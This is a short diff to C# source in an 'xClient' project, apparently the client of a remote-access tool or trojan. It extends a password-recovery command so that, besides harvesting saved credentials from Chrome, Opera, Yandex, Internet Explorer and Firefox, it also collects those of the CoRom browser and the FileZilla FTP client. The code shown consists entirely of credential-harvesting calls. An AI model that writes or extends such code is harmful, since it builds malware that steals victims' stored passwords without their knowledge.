@@ -11,6 +11,7 @@ using xClient.Enums;
 using System.Collections.Generic;
 using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
+using xClient.Core.Recovery.Utilities;
 
 namespace xClient.Core.Commands
 {
@@ -22,10 +23,12 @@ namespace xClient.Core.Commands
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
             recovered.AddRange(Chrome.GetSavedPasswords());
+            recovered.AddRange(CoRom.GetSavedPasswords());
             recovered.AddRange(Opera.GetSavedPasswords());
             recovered.AddRange(Yandex.GetSavedPasswords());
             recovered.AddRange(InternetExplorer.GetSavedPasswords());
             recovered.AddRange(Firefox.GetSavedPasswords());
+            recovered.AddRange(FileZilla.GetSavedPasswords());
 
             List<string> raw = new List<string>();
 
